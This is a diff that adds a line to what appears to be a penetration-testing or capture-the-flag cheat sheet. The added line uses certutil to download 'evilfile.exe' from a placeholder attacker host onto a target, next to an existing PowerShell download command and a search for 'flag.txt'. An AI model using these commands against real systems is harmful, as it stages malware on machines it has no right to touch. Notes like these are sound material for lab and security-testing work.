@@ -52,6 +52,9 @@ scp username@from_host:/remote/directory/file.txt username@to_host:/remote/direc
 # file transfer - powershell - pull files down on target
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://<attacker_ip>:8000/input.txt', 'output.txt')"
 
+# file transfer - cmd - pull files down on target
+certutil -urlcache -f http://<ATTACKER IP>/evilfile.exe evil.exe
+
 # finding loot - dir - search windows filesystem for file
 dir flag.txt /S /B
 # and in powershell...
